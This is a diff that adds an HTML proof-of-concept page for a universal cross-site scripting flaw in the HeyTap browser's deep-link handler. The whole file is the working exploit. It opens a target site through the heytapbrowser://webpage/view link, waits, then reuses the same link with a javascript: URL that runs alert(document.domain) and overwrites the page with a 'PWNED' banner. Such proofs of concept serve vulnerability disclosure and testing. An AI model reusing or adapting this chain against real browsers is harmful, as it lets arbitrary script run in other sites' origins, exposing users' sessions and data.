@@ -1,0 +1,41 @@
+<!doctype html>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Deep-link parser UXSS</title>
+<style>
+  body { font: 16px system-ui; max-width: 34rem; margin: 4rem auto; padding: 0 1rem; }
+  button { font: inherit; padding: .8rem 1.1rem; }
+  #status { margin-top: 1rem; color: #555; }
+</style>
+
+<button id="run">Run PoC</button>
+<div id="status">Ready</div>
+
+<script>
+const params = new URLSearchParams(location.search);
+const status = document.querySelector('#status');
+const button = document.querySelector('#run');
+const target = params.get('target') || 'https://www.google.com/';
+const route = url => 'heytapbrowser://webpage/view?url=' + encodeURIComponent(url);
+
+if (params.get('stage') === '1') {
+  button.hidden = true;
+  status.textContent = 'Running...';
+
+  location.href = route(target);
+
+  const deadline = performance.now() + 3000;
+  while (performance.now() < deadline) {}
+
+  location.href = route(
+    'javascript://x/%0Aalert(document.domain);document.write("<h1>PWNED BY BADCAT</h1>")'
+  );
+} else {
+  button.onclick = () => {
+    status.textContent = 'Starting...';
+    const stage = new URL(location.href);
+    stage.searchParams.set('stage', '1');
+    stage.searchParams.set('target', target);
+    location.href = route(stage.href);
+  };
+}
+</script>
